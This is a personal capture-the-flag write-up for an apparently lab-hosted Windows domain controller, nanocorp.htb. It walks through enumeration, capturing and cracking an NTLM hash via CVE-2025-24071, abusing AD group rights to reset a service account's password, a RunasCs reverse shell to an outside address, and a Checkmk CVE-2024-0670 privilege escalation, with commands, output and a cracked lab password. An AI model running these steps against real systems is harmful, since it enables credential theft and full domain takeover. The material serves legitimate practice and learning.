### Nmap
```
nmap -sV -sC -vv 10.129.3.94 

---OUTPUT---
Nmap scan report for 10.129.3.94
Host is up, received echo-reply ttl 127 (0.057s latency).
Scanned at 2026-02-20 09:23:50 EST for 96s
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-20 21:24:10Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.nanocorp.htb
| Issuer: commonName=DC01.nanocorp.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-20T01:58:09
| Not valid after:  2026-04-21T01:58:09
| MD5:     4f00 467e e490 4141 7c94 19b7 4ab3 76e6
| SHA-1:   0b96 8038 2148 abee 9372 2809 14f1 b62a a539 320b
| SHA-256: 0961 34be c943 f812 6485 90e9 551e 5a0a ea5e da0e 3816 7fa0 7f78 dd31 2442 96af
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQKyceh/nPao5KqGDAS36CdjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFEQzAxLm5hbm9jb3JwLmh0YjAeFw0yNTEwMjAwMTU4MDlaFw0y
| NjA0MjEwMTU4MDlaMBwxGjAYBgNVBAMTEURDMDEubmFub2NvcnAuaHRiMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwLfVnSlyVXDvehMvpvocpF69XQ4E
| QjHJ0ohAYkNamxD+VV4Lx8Dwtbm9k9aapGiOGQXdTNlmOd9g2GPunPzPD28fzp3F
| bLrV+gD34Oa67Q+aPN3H48jF9MUJJJQzOxRB79AeiZ8bCWSrxh3DiCIHfjTfnkty
| o89SIlFtLymNg9yDk3xSOsOPgYnN9bMWt796BPdTRcsE+5S8d931gwiFPlXhVCTi
| BTcZrkXzQiwxiSSoxNQXn8ihp7DGcESpZUYmXFXhcNBqzImymW1y0jWTCQ9+s5lm
| 2oI96kcKvt2vz81ihgu0vqB5uCwn9KuRYD70BirnVnVh/DBTer2ag/abVQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAHlMDS+PqA8rtEbHY/h6u/eConHuc3dLNtF94m9vSl8SKudVPcL7
| 8czQHDdSUndMyYoDwSkeY2vGGUkXyX/twIuDjE32OuKQAwCo4PsRTvjwpIkJ5ivR
| Jk+R8Fx6EdS6anfEBbKNP7nSag38BVu49H21NnXy/roO089kmMV6kMJ/dBMUC1rL
| lYMic816uMn0NFNzxvNsy2jEMbcFpQ8I27YyATPExl8oqqVssq9sItwH8QZ5+KyS
| QyXQu0HamVqGvAa67/XiZIPtZUcyWWfGE3+6HFndYWdsNFFgneWL0MAj1LyrqE+a
| zzSIlVvjRi21XI+Zb9c/VLOk7LxrEgXLD4w=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: NANOCORP
|   NetBIOS_Domain_Name: NANOCORP
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: nanocorp.htb
|   DNS_Computer_Name: DC01.nanocorp.htb
|   DNS_Tree_Name: nanocorp.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-20T21:24:41+00:00
|_ssl-date: 2026-02-20T21:25:22+00:00; +6h59m59s from scanner time.
5986/tcp open  ssl/wsmans?   syn-ack ttl 127
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Issuer: commonName=dc01.nanocorp.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-06T22:58:43
| Not valid after:  2026-04-06T23:18:43
| MD5:     2e3e 1a10 10b8 7f43 dc93 a4d9 05ef 6053
| SHA-1:   4674 6312 27ce e783 91b7 ec00 1746 f114 d669 4ea0
| SHA-256: 45de 169d 93f6 4bd0 148b 2369 5026 1601 482a d91d 294d f080 79e0 9e12 27a2 ab45
| -----BEGIN CERTIFICATE-----
| MIIDMDCCAhigAwIBAgIQIG1hb/WXAZBNVk/iii5EyjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFkYzAxLm5hbm9jb3JwLmh0YjAeFw0yNTA0MDYyMjU4NDNaFw0y
| NjA0MDYyMzE4NDNaMBwxGjAYBgNVBAMMEWRjMDEubmFub2NvcnAuaHRiMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvhk2VBmIaEaly06th345bTcNsYcV
| D4rgwzD861bdYfo3DYKG0XykF5u1O17P/jO7TUokAfQB2IeNTAb77ZU1iK1PdCCX
| bv6jeV+MEgsJcvCUSYdX5eEurSnDgTteegJ5APzUVgleNaFMkQi7rB9gG422AJov
| fJzCxPHm0irdfJt0cH5JRGg1+5zcm3A8FzQ1WxBS0KfmfMKCYhnFufpiUcFMtire
| azOyDb4IXFEpWuDVuPrr0O5GwWIiHlydtfY5u8+AeDaIEFHfP2qtN4T+6BEyadOT
| hdbPLxx53qFxAWVfoHjr6M9RWUHKEVmRBacBa4Jjj5VzEWt0IJM9Nq7/2QIDAQAB
| o24wbDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUF
| BwMBMBwGA1UdEQQVMBOCEWRjMDEubmFub2NvcnAuaHRiMB0GA1UdDgQWBBQaIgqw
| fFwJfesMFBU9Usbf0k55ODANBgkqhkiG9w0BAQsFAAOCAQEAY84V2Zwkjqqiraun
| KN+g7VoDri61Yn4U6DnVHt2h87gJRNVPukb64oAIqbTuyVRDe9CKtQo8SDul/x/Y
| GbNu0oHXYssqx37uowexR3AwoYkg1rLiRKik1cYbjawVjCUZ8ZEL1OLsMg362uaG
| hEvxeACIwiuoEpPXNWsLr4Vx44ImHMNVEeQg3luTTE/YcaProZO+/7TkB8yj1RbT
| D2hom7Eo8cGz5hVxCsHyv+KjUkWGC/prCEZXKgO+yHwc/ZGQIYnO0gEaNWnxlal5
| hFH4guGtiqkjjSQgPdSrCSxpEE1tHssCualeYyyMtxLq/dNLNSK+uRX+/A0/F7An
| VGJ53g==
|_-----END CERTIFICATE-----
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-20T21:24:42
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42835/tcp): CLEAN (Timeout)
|   Check 2 (port 29597/tcp): CLEAN (Timeout)
|   Check 3 (port 35615/udp): CLEAN (Timeout)
|   Check 4 (port 21576/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
```

### Port 80
![[Pasted image 20260220092736.png]]
- Clicking on About Us > Apply leads to `hire.nanocorp.htb`
![[Pasted image 20260220094521.png]]
- I cna upload a zip file. Looking around I find CVE-2025-24071 windows file explorer vulnerability. https://www.exploit-db.com/exploits/52310
- With this exploit I can upload a malicious zip file holding a malicious library_ms file which points to my smb. I can then grab the ntlm hash from my responder:
```
python3 exp.py -i 10.10.16.23

sudo responder -I tun0

## After uploading ZIP file you should get a hash in a bit

---OUTPUT---
[+] Listening for events...                                                                                                                                                                                                                                   

[SMB] NTLMv2-SSP Client   : 10.129.3.94
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:2863f1d9f30b6f56:CF6D0535D7AFFF7C1118EE7CED7F1B98:01010000000000008090B4A253A2DC01CDD4BF1D38D9942F0000000002000800480042004D00540001001E00570049004E002D00310055003500490056004F004500560058005800410004003400570049004E002D00310055003500490056004F00450056005800580041002E00480042004D0054002E004C004F00430041004C0003001400480042004D0054002E004C004F00430041004C0005001400480042004D0054002E004C004F00430041004C00070008008090B4A253A2DC01060004000200000008003000300000000000000000000000002000004D709B55DF525473E29848EE4DCCEDB362029BF714873C4BC38420574FE802790A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320036000000000000000000                                      
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc

```
![[Pasted image 20260220103227.png]]

- Using john I crack it to get a password : `dksehdgh712!@#`
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dksehdgh712!@#   (web_svc)     
1g 0:00:00:00 DONE (2026-02-20 10:32) 1.851g/s 3436Kp/s 3436Kc/s 3436KC/s dobson5499..djcward
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```


- Using nxc I can check if it is vulnerable to Dfs Coerce:
```
nxc smb 10.129.19.111 -u web_svc -p 'dksehdgh712!@#' -M coerce_plus

---OUTPUT---
SMB         10.129.19.111   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.111   445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
COERCE_PLUS 10.129.19.111   445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.19.111   445    DC01             VULNERABLE, PetitPotam
[10:35:35] ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                                               coerce_plus.py:178
           ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                                               coerce_plus.py:178
COERCE_PLUS 10.129.19.111   445    DC01             VULNERABLE, MSEven

```

- I grab bloodhound files :
```
bloodhound-python -c all -u 'web_svc' -p 'dksehdgh712!@#' -ns 10.129.19.111 -d  NANOCORP.HTB --zip

---OUTPUT---
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: nanocorp.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.nanocorp.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.nanocorp.htb
INFO: Done in 00M 04S
INFO: Compressing output into 20260330103705_bloodhound.zip
```

![[Pasted image 20260330104407.png]]

- web_svc can add self to IT Support group which can then force change password of monitoring_svc account.
![[Pasted image 20260330104523.png]]

- Using BloodyAD I change the group and then the password for monitoring_svc:
```
bloodyAD --host 10.129.243.199 -u web_svc -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' 'web_svc'      
[+] web_svc added to IT_SUPPORT
```
- I then change the password for monitoring_svc:
```
bloodyAD --host 10.129.243.199 -u web_svc -p 'dksehdgh712!@#' set password 'monitoring_svc' 'Password!234'
[+] Password changed successfully!
```

- I manage to connect via evil-winrm but it encounters some errors and delays. I then use another tool winrmexec to connect to the machine:
- First i get authenticated via kerberos to save a kerberos ticket:
```
faketime "+7hours" kinit monitoring_svc@NANOCORP.HTB                                                             
Password for monitoring_svc@NANOCORP.HTB: Password!234
```
- Then I can log in to the target:
```
faketime "+7hours" python3 winrmexec.py -port 5986 -ssl NANOCORP.HTB/'monitoring_svc:Password!234'@DC01.nanocorp.htb -k
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using DC01.nanocorp.htb
[*] '-url' not specified, using https://DC01.nanocorp.htb:5986/wsman
[*] '-spn' not specified, using HTTP/DC01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
[*] requesting TGT for NANOCORP.HTB\monitoring_svc
[*] requesting TGS for HTTP/DC01.nanocorp.htb@NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents> whoami
nanocorp\monitoring_svc
PS C:\Users\monitoring_svc\Documents> hostname
DC01
PS C:\Users\monitoring_svc\Documents>
```
![[Pasted image 20260331061904.png]]
- grab the user flag:
![[Pasted image 20260331061936.png]]


### Privilege Escalation
- Looking at winPEAS there is one service that seems to be AutoLoaded : Checkmk 2.1
![[Pasted image 20260331063503.png]]
- Online I find there is a local privilege escalation vulnerability with this version : CVE-2024-0670
- I grab an exploit from : https://github.com/elsevar11/CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit/blob/main/exploit.ps1
- Initially on using this exploit I don't get a reverse shell. I try some other PoC exploits and notice I don't have read access to C:\Windows\Temp
	- This made me think maybe there is some permission issue with this user 
	- I have another user with creds `web_svc`
- Using RunasCs I grab a shell as user `web_svc`:
```
.\RunasCs.exe web_svc dksehdgh712!@#  powershell.exe -r 10.10.17.206:9999
```
![[Pasted image 20260331083354.png]]

- I then grab the exploit witht his account (and nc.exe which I got already from the earlier account) and execute it:
```
powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\exploit4.ps1

---OUTPUT---
[*] Scanning for Check MK-related MSI files (SYSTEM-owned)...
[*] Successfully found Check MK MSI!
[*] Software Name: Check MK Agent 2.1
[*] MSI Path: C:\Windows\Installer\1e6f2.msi
[*] Seeding 100 to 15000...
[*] Seeding complete.
[*] Triggering MSI repair for Check MK...
[*] Sucessful!
```

- I grab a shell as `nt authority/system`
![[Pasted image 20260331083548.png]]

- I grab the root flag:
![[Pasted image 20260331083616.png]]


---------
## Try to do the final exploit manually when there is time